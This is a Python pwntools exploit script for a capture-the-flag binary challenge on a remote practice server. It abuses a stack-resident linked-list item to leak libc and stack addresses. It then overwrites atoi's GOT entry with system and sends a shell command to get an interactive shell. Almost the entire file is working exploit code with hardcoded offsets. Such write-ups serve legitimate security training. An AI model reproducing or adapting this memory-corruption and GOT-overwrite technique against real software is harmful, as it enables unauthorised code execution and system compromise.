from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-d", action="store_true")
args = parser.parse_args()

PROG = './chal'
db = """set $b = 0x08048a00
b *0x080486f9
c
"""

def start():
    return gdb.debug(PROG, db) if args.d else process(PROG)

### ------------------ EXPLOIT ------------------ ###

"""
May have to submit a few times for remote.
Vuln: Creation of item_struct on stack and storing in linked list
When on stack, it can obviously be overwritten.
"""

#r = start()
r = remote('chall.pwnable.tw', 10104)

def add(p):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'Device Number>', p)

def remove(p):
    r.sendlineafter(b'> ', b'3')
    r.sendafter(b'Item Number>', p)

def cart(p):
    r.sendlineafter(b'> ', b'4')
    r.sendafter(b'(y/n) > ', p)

def checkout(p):
    r.sendlineafter(b'> ', b'5')
    r.sendlineafter(b'(y/n) > ', p)

# reach 7174 total price
add(b'4')
for i in range(6):
    add(b'3')
for i in range(19):
    add(b'1')
checkout(b'y')

for i in range(6):
    remove(b'1')

# leak libc
read_got = 0x804b00c
cart(b'yy' + p32(read_got) + b'AAAA' + (b'\x00' * 4))

r.recvuntil(b'1: ')
read_libc = unpack(r.recv(4), 32, endian='little')
libc_base = read_libc - 0xd41c0
log.info('Leaked libc base: ' + hex(libc_base))

# leak stack addr
cart_head = 0x804b070
cart(b'yy' + p32(cart_head) + b'AAAA' + (b'\x00' * 4))

r.recvuntil(b'1: ')
stack_item = unpack(r.recv(4), 32, endian='little')
log.info('Leaked stack item addr: ' + hex(stack_item))

# difficult b/c both next & prev are being written to
# position stack over GOT to overwrite atoi -> system 
r.sendlineafter(b'> ', b'1')
delete_ebp = stack_item + 0x20
atoi_got = 0x804b040
system = libc_base + 0x3a940
remove(b'1A' + p32(cart_head) + b'CCCC' + p32(delete_ebp - 0xc) + p32(atoi_got + 0x22))

r.sendafter(b'> ', p32(system) + b';sh;\x00')

r.interactive()
